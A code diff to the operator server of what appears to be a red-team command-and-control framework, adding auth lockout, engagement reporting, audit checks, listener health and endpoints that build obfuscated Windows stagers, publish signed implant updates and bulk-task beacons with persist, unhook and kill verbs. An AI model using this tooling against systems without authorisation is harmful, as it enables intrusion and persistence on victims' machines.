@@ -20,6 +20,7 @@ import os as _os
 import socket
 import ssl
 import threading
+from collections import OrderedDict as _OrderedDict
 import time
 from typing import Optional, Tuple
 
@@ -37,6 +38,9 @@ from .lootstore import LootStore
 from .notes import NotesStore
 from .operators import OperatorRegistry
 from .webhooks import WebhookStore
+from .engagement import Engagement, SchemaError
+from .listener_health import HealthProber
+from . import atrest as _atrest
 
 try:
     from ..quiet_werkzeug import QuietWSGIRequestHandler
@@ -172,7 +176,44 @@ def _preauth_rate_allowed(ip: str) -> bool:
 _seen_lock = threading.Lock()
 _seen_certs: dict = {}
 
-SESSION_TTL_SECONDS = 12 * 3600
+# Reduced from 12 h: the session is only a liveness marker, and a
+# shorter window limits a stolen certificate+password pair.
+SESSION_TTL_SECONDS = 8 * 3600
+
+# Failed password HMACs lock the operator briefly. TOTP is gone, so
+# this is the throttle on offline-guessed passwords.
+_auth_lock = threading.Lock()
+_auth_fails: dict = {}          # cn -> (count, locked_until)
+AUTH_MAX_FAILS = 5
+AUTH_LOCK_SECONDS = 30
+
+
+def _auth_locked(cn: str) -> bool:
+    now = time.monotonic()
+    with _auth_lock:
+        count, until = _auth_fails.get(cn, (0, 0.0))
+        if until and now < until:
+            return True
+        if until and now >= until:
+            _auth_fails.pop(cn, None)
+        return False
+
+
+def _auth_fail(cn: str) -> bool:
+    """Count a bad HMAC. True when this call crossed the lockout."""
+    with _auth_lock:
+        count, _ = _auth_fails.get(cn, (0, 0.0))
+        count += 1
+        if count >= AUTH_MAX_FAILS:
+            _auth_fails[cn] = (0, time.monotonic() + AUTH_LOCK_SECONDS)
+            return True
+        _auth_fails[cn] = (count, 0.0)
+        return False
+
+
+def _auth_clear(cn: str) -> None:
+    with _auth_lock:
+        _auth_fails.pop(cn, None)
 
 _nonce_lock = threading.Lock()
 _nonce_cache: dict = {}    # (cn, nonce) -> expiry_monotonic
@@ -299,6 +340,10 @@ class OperatorListener:
         self.registry = registry
         self.audit = audit
         self.multiplayer = multiplayer_state
+        self._jump_cache = _OrderedDict()
+        self._jump_locks: dict = {}
+        self._jump_guard = threading.Lock()
+        self._jump_max = 8
 
         try:
             from .build_manager import BuildManager
@@ -322,6 +367,15 @@ class OperatorListener:
             _os.path.dirname(_os.path.abspath(__file__)),
             '..', '..', 'logs')
         try:
+            self.engagement = Engagement(
+                _os.path.join(_logs_dir, 'engagement.json'))
+        except SchemaError as exc:
+            print(f"[ENGAGEMENT] {exc}; upgrade the server or move "
+                  f"the file aside", flush=True)
+            raise
+        except Exception:
+            self.engagement = Engagement()
+        try:
             self.aliases = AliasStore(
                 _os.path.join(_logs_dir, 'aliases.json'))
         except Exception:
@@ -331,6 +385,7 @@ class OperatorListener:
                 _os.path.join(_logs_dir, 'creds.json'))
         except Exception:
             self.creds = None
+        self._migrate_at_rest(_logs_dir)
         try:
             self.notes = NotesStore(_logs_dir)
         except Exception:
@@ -346,6 +401,8 @@ class OperatorListener:
                 self.engine.attach_webhooks(self.webhooks)
         except Exception:
             pass
+        self.health = HealthProber(self._lman, fire=self._fire_health)
+        self.health.start()
 
         self._app = self._build_app()
         self._thread: Optional[threading.Thread] = None
@@ -465,6 +522,14 @@ class OperatorListener:
         def audit_read():
             return self._audit_read()
 
+        @app.route('/api/v1/audit/verify', methods=['POST'])
+        def audit_verify():
+            return self._with_cap('audit.read.all', self._audit_verify)
+
+        @app.route('/api/v1/atrest', methods=['POST'])
+        def atrest_cmd():
+            return self._with_cap('audit.read.all', self._atrest_cmd)
+
         @app.route('/api/v1/commands', methods=['POST'])
         def commands_list():
             return self._with_cap(
@@ -485,6 +550,54 @@ class OperatorListener:
         @app.route('/api/v1/bofs/remove', methods=['POST'])
         def bofs_remove():
             return self._with_cap('beacon.build', self._bofs_remove)
+
+        @app.route('/api/v1/hosts', methods=['POST'])
+        def hosts_list():
+            return self._with_cap('beacon.list', self._hosts_list)
+
+        @app.route('/api/v1/model', methods=['POST'])
+        def model_get():
+            return self._with_cap('beacon.list', self._model_get)
+
+        @app.route('/api/v1/evidence', methods=['POST'])
+        def evidence():
+            return self._with_cap('beacon.use', self._evidence)
+
+        @app.route('/api/v1/export/ioc', methods=['POST'])
+        def export_ioc():
+            return self._with_cap('beacon.list', self._export_ioc)
+
+        @app.route('/api/v1/export/stix', methods=['POST'])
+        def export_stix():
+            return self._with_cap('beacon.list', self._export_stix)
+
+        @app.route('/api/v1/export/mitre', methods=['POST'])
+        def export_mitre():
+            return self._with_cap('beacon.list', self._export_mitre)
+
+        @app.route('/api/v1/bulk', methods=['POST'])
+        def bulk():
+            return self._with_cap('beacon.use', self._bulk)
+
+        @app.route('/api/v1/findings', methods=['POST'])
+        def findings():
+            return self._with_cap('beacon.use', self._findings)
+
+        @app.route('/api/v1/timeline', methods=['POST'])
+        def timeline():
+            return self._with_cap('beacon.list', self._timeline)
+
+        @app.route('/api/v1/report', methods=['POST'])
+        def report():
+            return self._with_cap('beacon.list', self._report)
+
+        @app.route('/api/v1/agent/publish', methods=['POST'])
+        def agent_publish():
+            return self._with_cap('beacon.build', self._agent_publish)
+
+        @app.route('/api/v1/jump/stage', methods=['POST'])
+        def jump_stage():
+            return self._with_cap('beacon.use', self._jump_stage)
 
         @app.route('/api/v1/beacon/build', methods=['POST'])
         def beacon_build():
@@ -729,6 +842,15 @@ class OperatorListener:
         def c2_profiles():
             return self._with_cap(
                 'beacon.build', self._c2_profiles)
+
+        @app.route('/api/v1/listeners/health', methods=['POST'])
+        def listeners_health():
+            return self._with_cap('listener.view', self._listeners_health)
+
+        @app.route('/api/v1/listeners/health/probe', methods=['POST'])
+        def listeners_health_probe():
+            return self._with_cap('listener.manage',
+                                  self._listeners_health_probe)
 
         @app.route('/api/v1/listeners', methods=['POST'])
         def listeners_list():
@@ -3650,6 +3772,18 @@ class OperatorListener:
     # ------------------------------------------------------------------
     # Identity / authorization gate
 
+    def _auth_bad_password(self, cn, role, ip) -> None:
+        if _auth_fail(cn):
+            try:
+                self.audit.write(
+                    operator=cn, role=role, source_ip=ip,
+                    action='auth.lockout', target=cn,
+                    outcome='error',
+                    detail=f'{AUTH_MAX_FAILS} bad HMACs, '
+                           f'{AUTH_LOCK_SECONDS}s lock')
+            except Exception:
+                pass
+
     def _extract_peer(self) -> Tuple[Optional[str], Optional[str], str]:
         """Return (cn, role, source_ip), or (None, None, ip) if the
         peer cert is missing, unparseable, or the operator is
@@ -3676,6 +3810,9 @@ class OperatorListener:
         if entry.get('revoked'):
             request.environ['tornado.auth_error'] = 'revoked'
             return None, None, ip
+        if _auth_locked(cn):
+            request.environ['tornado.auth_error'] = 'locked'
+            return None, None, ip
 
         if entry.get('auth_hash'):
             ts = request.headers.get('X-Operator-Ts', '')
@@ -3690,10 +3827,12 @@ class OperatorListener:
                 ok = self.registry.verify_auth(
                     cn, request.path, ts, nonce, mac)
             except Exception:
+                self._auth_bad_password(cn, entry.get('role', ''), ip)
                 request.environ['tornado.auth_error'] = \
                     'password_invalid'
                 return None, None, ip
             if not ok:
+                self._auth_bad_password(cn, entry.get('role', ''), ip)
                 request.environ['tornado.auth_error'] = \
                     'password_invalid'
                 return None, None, ip
@@ -3705,9 +3844,11 @@ class OperatorListener:
                     'password_invalid'
                 return None, None, ip
             if not _nonce_accept(cn, nonce, ts_float):
+                self._auth_bad_password(cn, entry.get('role', ''), ip)
                 request.environ['tornado.auth_error'] = \
                     'password_invalid'
                 return None, None, ip
+            _auth_clear(cn)
 
         with _seen_lock:
             now_mono = time.monotonic()
@@ -3968,7 +4109,12 @@ class OperatorListener:
         aliases = (self.aliases.all()
                    if self.aliases is not None else {})
         beacons = []
-        for s in self.engine.list_all():
+        sessions = self.engine.list_all()
+        try:
+            self.engagement.observe_many(sessions)
+        except Exception:
+            pass
+        for s in sessions:
             a = aliases.get(str(s.id), {}) or {}
             viewers = _viewer_snapshot(s.id)
             others = [v for v in viewers if v['name'] != name]
@@ -4142,6 +4288,13 @@ class OperatorListener:
             resp.headers['X-Audit-Id'] = audit_id
             return resp
 
+        if verb in ('persist', 'update', 'stomp', 'unhook', 'fork'):
+            try:
+                self.engagement.record(
+                    verb, f'#{"%d" % bid} ' + ' '.join(args)[:200],
+                    name)
+            except Exception:
+                pass
         detail = verb
         if args:
             detail += ' ' + ' '.join(str(a) for a in args)
@@ -4187,6 +4340,8 @@ class OperatorListener:
         g = Graph(self.engine)
 
         if mode == 'json':
+            if (payload.get('source') or '') == 'model':
+                return jsonify(Graph.from_model(self.engagement))
             return jsonify(g.build())
 
         if mode == 'path':
@@ -4550,6 +4705,58 @@ class OperatorListener:
                     f"cas={len(out['cas'])}"))
         return jsonify({**out, 'audit_id': audit_id})
 
+    def _fire_health(self, event, payload) -> None:
+        if self.webhooks is None:
+            return
+        sev = 'crit' if payload.get('to') == 'down' else 'warn'
+        self.webhooks.fire(event, payload, severity=sev)
+
+    def _listeners_health(self, name, role, ip):
+        mgr = self._lman()
+        if mgr is None:
+            return Response(status=503)
+        rows = []
+        for cfg in mgr.list():
+            st = self.health.status(cfg.get('id', ''))
+            rows.append({
+                'id': cfg.get('id'), 'name': cfg.get('name'),
+                'type': cfg.get('type'), 'state': st['state'],
+                'last_ok': st['last_ok'],
+                'last_error': st['last_error'],
+                'probe_ms': st['probe_ms'],
+                'history': st['history'],
+                'cert_days_left': self.health.cert_days_left(cfg),
+            })
+        audit_id = self.audit.write(
+            operator=name, role=role, source_ip=ip,
+            action='listener.health', detail=f'{len(rows)} listeners')
+        return jsonify({'listeners': rows, 'audit_id': audit_id})
+
+    def _listeners_health_probe(self, name, role, ip):
+        mgr = self._lman()
+        if mgr is None:
+            return Response(status=503)
+        p = request.get_json(force=True, silent=True) or {}
+        lid = (p.get('listener') or '').strip()
+        if lid:
+            cfg = mgr.get(lid)
+            if cfg is None:
+                return jsonify({'error': 'unknown listener'}), 404
+            if cfg.get('status') != 'running':
+                return jsonify({'error': 'listener is not running'}), 409
+            self.health.probe(cfg)
+            audit_id = self.audit.write(
+                operator=name, role=role, source_ip=ip,
+                action='listener.health', target=lid, detail='manual')
+            return jsonify({'ok': True, 'state':
+                            self.health.status(lid)['state'],
+                            'audit_id': audit_id})
+        self.health.probe_all()
+        audit_id = self.audit.write(
+            operator=name, role=role, source_ip=ip,
+            action='listener.health', detail='manual all')
+        return jsonify({'ok': True, 'audit_id': audit_id})
+
     def _listeners_list(self, name, role, ip):
         if not constants.has_capability(
                 role, 'listener.view', is_local=False):
@@ -4569,6 +4776,10 @@ class OperatorListener:
         except Exception as exc:
             return self._lman_err(
                 name, role, ip, 'listener.list', exc)
+        for row in rows:
+            row['health'] = self.health.status(
+                row.get('id', '')).get('state', 'unknown')
+            row['cert_days_left'] = self.health.cert_days_left(row)
         audit_id = self.audit.write(
             operator=name, role=role, source_ip=ip,
             action='listener.list',
@@ -4618,6 +4829,13 @@ class OperatorListener:
             detail=(f"type={created['type']} "
                     f"bind={created['host']}:{created['port']} "
                     f"enabled={created.get('enabled')}"))
+        try:
+            self.engagement.add_timeline(
+                'listener.create',
+                f"{created['type']} {created['name']} on "
+                f"{created['host']}:{created['port']}", name)
+        except Exception:
+            pass
         resp = jsonify({'ok': True, 'listener': created,
                         'audit_id': audit_id})
         resp.headers['X-Audit-Id'] = audit_id
@@ -5112,6 +5330,395 @@ class OperatorListener:
     # ------------------------------------------------------------------
     # Remote build
 
+    def _model_get(self, name, role, ip):
+        p = request.get_json(force=True, silent=True) or {}
+        try:
+            since = float(p.get('since') or 0)
+        except (TypeError, ValueError):
+            since = 0.0
+        try:
+            limit = max(1, min(int(p.get('limit') or 200), 2000))
+        except (TypeError, ValueError):
+            limit = 200
+        ents = self.engagement.entities()
+
+        def newer(rows):
+            return [r for r in rows
+                    if float(r.get('ts') or 0) > since][:limit]
+
+        timeline = [t for t in self.engagement.timeline(5000)
+                    if float(t.get('ts') or 0) > since][-limit:]
+        return jsonify({
+            'schema': 2,
+            'hosts': self.engagement.hosts(),
+            'users': newer(ents['users']),
+            'shares': newer(ents['shares']),
+            'services': newer(ents['services']),
+            'evidence': newer(ents['evidence']),
+            'findings': newer(self.engagement.findings()),
+            'timeline': timeline,
+            'mitre': self.engagement.mitre(),
+            'dataset': self.engagement.dataset_hash(),
+        })
+
+    def _evidence(self, name, role, ip):
+        p = request.get_json(force=True, silent=True) or {}
+        if not p.get('sha256') and not p.get('name') \
+                and not p.get('loot'):
+            return jsonify({'evidence': self.engagement.entities()
+                            ['evidence']})
+        digest = str(p.get('loot') or p.get('sha256') or '').lower()
+        display = str(p.get('name') or '')[:200]
+        size = int(p.get('size') or 0)
+        if p.get('loot'):
+            if self.loot is None:
+                return jsonify({'error': 'loot store unavailable'}), 503
+            meta = self.loot.stat(digest)
+            if meta is None:
+                return jsonify({'error': 'unknown loot digest'}), 404
+            display = display or meta.get('name', '') or digest
+            size = int(meta.get('size') or 0)
+        try:
+            row = self.engagement.add_evidence(
+                digest, display,
+                str(p.get('host') or '')[:120],
+                str(p.get('detail') or '')[:2000], name, size)
+        except ValueError as exc:
+            return jsonify({'error': str(exc)}), 400
+        audit_id = self.audit.write(
+            operator=name, role=role, source_ip=ip,
+            action='evidence.add', target=str(row['id']),
+            detail=row['sha256'][:16])
+        return jsonify({'ok': True, 'evidence': row,
+                        'audit_id': audit_id})
+
+    def _export_ioc(self, name, role, ip):
+        body = self.engagement.ioc_csv()
+        audit_id = self.audit.write(
+            operator=name, role=role, source_ip=ip,
+            action='export.ioc', detail=f'{len(body)} bytes')
+        resp = jsonify({'ok': True, 'csv': body, 'audit_id': audit_id})
+        resp.headers['Content-Type'] = 'application/json'
+        resp.headers['X-Filename'] = 'iocs.csv'
+        resp.headers['Content-Disposition'] = (
+            'attachment; filename="iocs.csv"')
+        return resp
+
+    def _export_stix(self, name, role, ip):
+        bundle = self.engagement.stix()
+        audit_id = self.audit.write(
+            operator=name, role=role, source_ip=ip,
+            action='export.stix',
+            detail=f"{len(bundle['objects'])} objects")
+        resp = jsonify({'ok': True, 'bundle': bundle,
+                        'audit_id': audit_id})
+        resp.headers['X-Filename'] = 'stix.json'
+        resp.headers['Content-Disposition'] = (
+            'attachment; filename="stix.json"')
+        return resp
+
+    def _export_mitre(self, name, role, ip):
+        return jsonify({'mitre': self.engagement.mitre()})
+
+    def _bulk(self, name, role, ip):
+        p = request.get_json(force=True, silent=True) or {}
+        action = (p.get('action') or '').lower()
+        ids = p.get('ids') or []
+        if not isinstance(ids, list) or not ids:
+            return jsonify({'error': 'ids required'}), 400
+        try:
+            ids = [int(i) for i in ids]
+        except (TypeError, ValueError):
+            return jsonify({'error': 'ids must be integers'}), 400
+        truncated = len(ids) > 500
+        ids = ids[:500]
+
+        results = []
+        if action == 'task':
+            verb = str(p.get('verb') or '')
+            args = p.get('args') or []
+            if not verb or not isinstance(args, list):
+                return jsonify({'error': 'verb and args required'}), 400
+            timeout = max(1, min(int(p.get('timeout') or 120), 900))
+            for bid in ids:
+                try:
+                    tid = self.engine.enqueue(bid, verb,
+                                              [str(a) for a in args],
+                                              timeout=timeout,
+                                              queued_by=name)
+                    err = None if tid else 'queue full'
+                except Exception as exc:
+                    tid, err = None, str(exc)
+                outcome = 'ok' if tid else 'error'
+                audit_id = self.audit.write(
+                    operator=name, role=role, source_ip=ip,
+                    action='beacon.use', target=f'#{bid}',
+                    outcome=outcome,
+                    detail=f'bulk {verb} ' + ' '.join(
+                        str(a) for a in args)[:400])
+                row = {'id': bid, 'task_id': tid,
+                       'audit_id': audit_id}
+                if err:
+                    row['error'] = err
+                results.append(row)
+        elif action in ('tag', 'untag'):
+            tag = str(p.get('tag') or '')[:48]
+            if not tag:
+                return jsonify({'error': 'tag required'}), 400
+            store = self.aliases
+            if store is None:
+                return Response(status=503)
+            for bid in ids:
+                try:
+                    if action == 'tag':
+                        store.add_tag(bid, tag, name)
+                    else:
+                        store.remove_tag(bid, tag, name)
+                    outcome = 'ok'
+                except Exception:
+                    outcome = 'error'
+                audit_id = self.audit.write(
+                    operator=name, role=role, source_ip=ip,
+                    action=f'beacon.{action}', target=f'#{bid}',
+                    outcome=outcome, detail=tag)
+                results.append({'id': bid, 'audit_id': audit_id,
+                                'outcome': outcome})
+        elif action == 'kill':
+            for bid in ids:
+                try:
+                    tid = self.engine.enqueue(bid, 'kill', [],
+                                              timeout=30,
+                                              queued_by=name)
+                    err = None if tid else 'queue full'
+                except Exception as exc:
+                    tid, err = None, str(exc)
+                audit_id = self.audit.write(
+                    operator=name, role=role, source_ip=ip,
+                    action='beacon.kill', target=f'#{bid}',
+                    outcome='ok' if tid else 'error', detail='bulk kill')
+                row = {'id': bid, 'task_id': tid,
+                       'audit_id': audit_id}
+                if err:
+                    row['error'] = err
+                results.append(row)
+        else:
+            return jsonify({'error': 'action must be task, tag, '
+                                     'untag or kill'}), 400
+        return jsonify({'ok': True, 'results': results,
+                        'truncated': truncated})
+
+    def _hosts_list(self, name, role, ip):
+        rows = self.engagement.hosts()
+        return jsonify({'hosts': rows})
+
+    def _findings(self, name, role, ip):
+        p = request.get_json(force=True, silent=True) or {}
+        if p.get('title'):
+            ev = p.get('evidence') or []
+            if not isinstance(ev, list):
+                ev = []
+            row = self.engagement.add_finding(
+                str(p.get('title'))[:120],
+                str(p.get('severity') or 'info').lower(),
+                str(p.get('host') or '')[:120],
+                str(p.get('detail') or '')[:2000], name,
+                [str(e)[:64] for e in ev][:32])
+            audit_id = self.audit.write(
+                operator=name, role=role, source_ip=ip,
+                action='finding.add', target=str(row['id']),
+                detail=row['title'])
+            return jsonify({'ok': True, 'finding': row,
+                            'audit_id': audit_id})
+        return jsonify({'findings': self.engagement.findings()})
+
+    def _timeline(self, name, role, ip):
+        p = request.get_json(force=True, silent=True) or {}
+        if p.get('text'):
+            self.engagement.add_timeline(
+                str(p.get('kind') or 'note'),
+                str(p.get('text')), name)
+        return jsonify({'timeline': self.engagement.timeline()})
+
+    def _report(self, name, role, ip):
+        p = request.get_json(force=True, silent=True) or {}
+        try:
+            at = float(p.get('at') or 0) or None
+        except (TypeError, ValueError):
+            at = None
+        audit_id = self.audit.write(
+            operator=name, role=role, source_ip=ip,
+            action='report.export', detail='markdown')
+        return jsonify({'ok': True, 'markdown':
+                        self.engagement.report(at),
+                        'dataset': self.engagement.dataset_hash(),
+                        'audit_id': audit_id})
+
+    def _jump_stage(self, name, role, ip):
+        import time as _time
+        payload = request.get_json(force=True, silent=True) or {}
+        lid = (payload.get('listener') or '').strip()
+        mgr = self._lman()
+        if mgr is None:
+            return Response(status=503)
+        cfg = mgr.get(lid) if lid else None
+        if cfg is None:
+            running = mgr.list(running_only=True)
+            cfg = next((r for r in running if r.get('type') == 'http'),
+                       None)
+        if cfg is None or cfg.get('type') != 'http':
+            return jsonify({'error': 'jump needs a running HTTP listener'}), 400
+        if cfg.get('status') != 'running':
+            return jsonify({'error': 'listener is not running'}), 409
+
+        host = cfg.get('public_host') or cfg.get('host') or ''
+        if host in ('0.0.0.0', '::', ''):
+            host = '127.0.0.1'
+        tls = cfg.get('tls') or {}
+        mode = tls.get('mode', 'server')
+        if mode == 'none':
+            return jsonify({'error':
+                'jump stagers need a TLS-enabled HTTP listener'}), 400
+        url = f"https://{host}:{cfg['port']}"
+
+        key = (cfg['id'], url)
+        with self._jump_guard:
+            lock = self._jump_locks.setdefault(key, threading.Lock())
+        with lock:
+            hit = self._jump_cache.get(key)
+            if hit and _time.time() - hit[0] < 1800:
+                self._jump_cache.move_to_end(key)
+                return jsonify({'ok': True, 'url': url,
+                                'data_b64': hit[1], 'sha256': hit[2]})
+            return self._jump_build(name, role, ip, cfg, url, key,
+                                    tls, mode)
+
+    def _publish_url(self) -> str:
+        mgr = self._lman()
+        if mgr is None:
+            raise RuntimeError('no listener manager')
+        cfg = next((r for r in mgr.list(running_only=True)
+                    if r.get('type') == 'http'
+                    and (r.get('tls') or {}).get('mode', 'server')
+                    != 'none'), None)
+        if cfg is None:
+            raise RuntimeError('publish needs a running TLS HTTP listener')
+        host = cfg.get('public_host') or cfg.get('host') or ''
+        if host in ('0.0.0.0', '::', ''):
+            host = '127.0.0.1'
+        return f"https://{host}:{cfg['port']}"
+
+    def _agent_publish(self, name, role, ip):
+        """Sign a staged build so an agent can self-update from it."""
+        payload = request.get_json(force=True, silent=True) or {}
+        bid = (payload.get('build_id') or '').strip()
+        bm = self.build_manager
+        if bm is None or not bid:
+            return jsonify({'error': 'build_id required'}), 400
+        try:
+            info = bm.info(bid, name)
+        except Exception as exc:
+            return jsonify({'error': str(exc)}), 400
+        if not info:
+            return jsonify({'error': 'unknown build'}), 404
+        handler = getattr(self.engine, 'handler', None)
+        signer = getattr(handler, 'signer', None) if handler else None
+        if signer is None:
+            return jsonify({'error': 'server signer unavailable'}), 503
+
+        digest = info['sha256']
+        canonical = {'digest': digest}
+        sig = signer.sign_task(canonical)
+        try:
+            url = self._publish_url()
+        except RuntimeError as exc:
+            return jsonify({'error': str(exc)}), 400
+
+        # Keep a copy so the build can be finished before use.
+        import os as _os, shutil as _sh
+        src = _os.path.join(_os.path.dirname(
+            _os.path.dirname(_os.path.abspath(__file__))),
+            'beacon_output')
+        dst_dir = _os.path.join(src, 'published')
+        _os.makedirs(dst_dir, exist_ok=True)
+        with bm._lock:
+            build = bm._builds.get(bid)
+            if build is None:
+                return jsonify({'error': 'build expired'}), 410
+            staged = build.path
+            _sh.copy2(staged, _os.path.join(dst_dir, digest + '.exe'))
+
+        audit_id = self.audit.write(
+            operator=name, role=role, source_ip=ip,
+            action='agent.publish', target=bid,
+            detail=f'{url}/{digest} sha256={digest[:16]}')
+        return jsonify({'ok': True, 'url': url + '/published/' + digest,
+                        'sha256': digest, 'signature': sig,
+                        'audit_id': audit_id})
+
+    def _jump_build(self, name, role, ip, cfg, url, key, tls, mode):
+        import time as _time
+        from ..beacon.builder import BeaconBuilder, BeaconBuildConfig
+        import base64 as _b64, hashlib as _hl, os as _os, shutil as _sh
+        src = _os.path.join(_os.path.dirname(_os.path.dirname(
+            _os.path.abspath(__file__))), 'beacon')
+        out_dir = _os.path.join(_os.path.dirname(src),
+                                'beacon_output', 'jump')
+        _os.makedirs(out_dir, exist_ok=True)
+        cfg_b = BeaconBuildConfig(
+            target_os='windows', target_arch='amd64',
+            output_format='stager', transport_mode='http', url=url,
+            stage_name='jump-' + cfg['id'], tags='svc_host',
+            garble=_sh.which('garble') is not None)
+        if mode != 'none' and tls.get('cert_path'):
+            cfg_b.root_ca_path = tls['cert_path']
+        try:
+            builder = BeaconBuilder(src, out_dir)
+            path = builder.build(cfg_b)
+            body = open(path, 'rb').read()
+        except Exception as exc:
+            audit_id = self.audit.write(
+                operator=name, role=role, source_ip=ip,
+                action='jump.stage', outcome='error',
+                detail=str(exc)[:200])
+            resp = jsonify({'error': str(exc), 'audit_id': audit_id})
+            resp.status_code = 500
+            return resp
+        digest = _hl.sha256(body).hexdigest()
+        data = _b64.b64encode(body).decode('ascii')
+        self._jump_cache[key] = (_time.time(), data, digest)
+        self._jump_cache.move_to_end(key)
+        while len(self._jump_cache) > self._jump_max:
+            self._jump_cache.popitem(last=False)
+        self._jump_sweep(out_dir)
+        try:
+            self.engagement.add_timeline(
+                'jump', f"{name} staged jump via {url}", name)
+        except Exception:
+            pass
+        audit_id = self.audit.write(
+            operator=name, role=role, source_ip=ip,
+            action='jump.stage', target=cfg['id'],
+            detail=f'{url} sha256={digest[:16]}')
+        return jsonify({'ok': True, 'url': url, 'data_b64': data,
+                        'sha256': digest, 'audit_id': audit_id})
+
+    @staticmethod
+    def _jump_sweep(out_dir):
+        """Drop stager files older than an hour."""
+        import os as _os
+        import time as _time
+        try:
+            cutoff = _time.time() - 3600
+            for name in _os.listdir(out_dir):
+                p = _os.path.join(out_dir, name)
+                try:
+                    if _os.path.isfile(p) and _os.path.getmtime(p) < cutoff:
+                        _os.remove(p)
+                except OSError:
+                    pass
+        except OSError:
+            pass
+
     def _beacon_build(self, name, role, ip):
         """Compile an agent from a remote operator's config.
 
@@ -5516,6 +6123,44 @@ class OperatorListener:
         e = session.work_hours_end
         return f"{s // 60:02d}:{s % 60:02d}-{e // 60:02d}:{e % 60:02d}"
 
+    def _audit_verify(self, name, role, ip):
+        """Re-walk the chain, checkpoint and anchor. Admin only."""
+        payload = request.get_json(force=True, silent=True) or {}
+        try:
+            ok, msg = self.audit.verify(
+                full=bool(payload.get('full')))
+        except Exception as exc:
+            ok, msg = False, str(exc)
+        audit_id = self.audit.write(
+            operator=name, role=role, source_ip=ip,
+            action='audit.verify',
+            outcome='ok' if ok else 'error', detail=msg[:200])
+        return jsonify({'ok': ok, 'message': msg, 'audit_id': audit_id})
+
+    def _atrest_cmd(self, name, role, ip):
+        """Report plaintext leftovers, or force a migration."""
+        payload = request.get_json(force=True, silent=True) or {}
+        action = (payload.get('action') or 'status').lower()
+        logs = _os.path.join(_os.path.dirname(
+            _os.path.abspath(__file__)), '..', '..', 'logs')
+        logs = _os.path.normpath(logs)
+        if action == 'status':
+            bad = _atrest.scan([logs], ['listeners.json'])
+            return jsonify({'ok': True, 'plaintext': bad,
+                            'count': len(bad),
+                            'migrated': not _atrest.needs_migration()})
+        if action == 'migrate':
+            try:
+                _os.remove(_atrest._marker_path())
+            except OSError:
+                pass
+            self._migrate_at_rest(logs)
+            audit_id = self.audit.write(
+                operator=name, role=role, source_ip=ip,
+                action='atrest.migrate')
+            return jsonify({'ok': True, 'audit_id': audit_id})
+        return jsonify({'error': 'action must be status or migrate'}), 400
+
     def _audit_read(self):
         """Return audit entries for one operator (or all, for admins).
 
@@ -5620,6 +6265,46 @@ class OperatorListener:
                 bm.shutdown()
             except Exception:
                 pass
+        try:
+            self.audit.flush()
+        except Exception:
+            pass
+        try:
+            self.engagement.flush()
+        except Exception:
+            pass
+        try:
+            self.health.stop()
+        except Exception:
+            pass
+
+    @staticmethod
+    def _migrate_at_rest(logs_dir) -> None:
+        """One-shot migration of plaintext state to at-rest v2.
+
+        Guarded by a key fingerprint marker so a restart does not
+        re-read the loot and chat stores.
+        """
+        if not _atrest.needs_migration():
+            return
+        import glob as _glob
+        from . import chat as _chat
+        from . import lootstore as _loot
+        state = [_os.path.join(logs_dir, n) for n in (
+            'creds.json', 'notes.json', 'engagement.json',
+            'aliases.json', 'webhooks.json', 'schedules.json')]
+        state += _glob.glob(_os.path.join(logs_dir, 'bnotes', '*.json'))
+        state += ['listeners.json']
+        try:
+            moved = len(_atrest.migrate_all(state))
+            moved += _chat.migrate_persisted(constants.CHAT_LOG_DIR)
+            moved += _loot.migrate_blobs(constants.LOOT_DIR)
+            _atrest.mark_migrated()
+            if moved:
+                print(f"[AT-REST] encrypted {moved} state file(s)",
+                      flush=True)
+        except Exception as exc:
+            print(f"[AT-REST] migration skipped: {exc}", flush=True)
 
     def _make_tls_context(self) -> Optional[ssl.SSLContext]:
         try:
